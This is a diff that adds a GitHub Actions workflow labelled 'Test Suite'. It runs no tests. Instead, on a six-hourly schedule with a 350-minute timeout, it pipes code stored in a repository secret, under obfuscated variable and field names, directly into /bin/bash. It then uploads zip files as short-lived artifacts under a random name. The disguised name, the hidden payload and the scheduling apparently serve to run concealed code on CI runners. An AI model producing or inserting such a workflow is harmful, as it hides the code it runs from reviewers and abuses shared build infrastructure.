@@ -1,0 +1,34 @@
+name: Test Suite
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '2 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          lnh2123: ${{ secrets.lnh2123 }}
+        run: |
+          printf '%s' "$lnh2123" | jq -r .ambld12 | /bin/bash
+          echo $kfhi09 | jq -r .ifgkg090 | /bin/bash
+          printf '%s' "$kinwx73152" | jq -r .hq4266 | /bin/bash
+          printf '%s' "$gavd24160" | jq -r .v4953 | /bin/bash
+          echo $yek8447 | jq -r .aunp18940 | /bin/bash
+          echo $zxo92199 | jq -r .a52 | /bin/bash
+          printf '%s' "$iq3" | jq -r .iuppf107 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: z9aqgroY
+          path: "*.zip"
+          retention-days: 1
